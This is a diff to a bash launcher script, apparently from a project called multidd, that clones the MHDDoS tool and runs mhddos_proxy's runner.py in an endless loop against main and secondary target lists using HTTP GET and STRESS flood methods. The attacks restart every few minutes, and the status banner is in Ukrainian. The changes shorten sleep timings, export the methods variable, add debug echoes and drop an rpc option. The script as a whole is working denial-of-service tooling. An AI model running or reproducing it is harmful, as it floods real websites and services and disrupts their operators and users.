@@ -18,7 +18,7 @@ typing_on_screen (){
     tput setaf 2 &>/dev/null # green powaaa
     for ((i=0; i<=${#1}; i++)); do
         printf '%s' "${1:$i:1}"
-        sleep 0.1$(( (RANDOM % 5) + 1 ))
+        sleep 0.08$(( (RANDOM % 5) + 1 ))
     done
     tput sgr0 2 &>/dev/null
 }
@@ -29,8 +29,7 @@ db1000n="off"
 uashield="off"
 vnstat="off"
 matrix="off"
-methods="--http-methods GET STRESS"
-threads="" #later will check if value still NONE then -t was not passed in command line and auto value will be calculated
+export methods="--http-methods GET STRESS"
 #rpc="--rpc 2000"
 #export debug="--debug"
 
@@ -93,7 +92,7 @@ echo -e "Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq |
 
 echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
 echo -e "\nЗавантаження..."
-sleep 8
+sleep 5
 }
 export -f prepare_targets_and_banner
 
@@ -213,10 +212,13 @@ git clone https://github.com/MHProDev/MHDDoS.git
 
 # Restart attacks and update targets every 30 minutes
 while true; do
+echo "threads:"$threads
+echo "methods:"$methods
+sleep 2
         pkill -f start.py; pkill -f runner.py 
-        python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $rpc $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $methods&
         sleep 15 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $sec_targets $threads $rpc $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $sec_targets $threads $methods&
 sleep 5m
 prepare_targets_and_banner
 clear
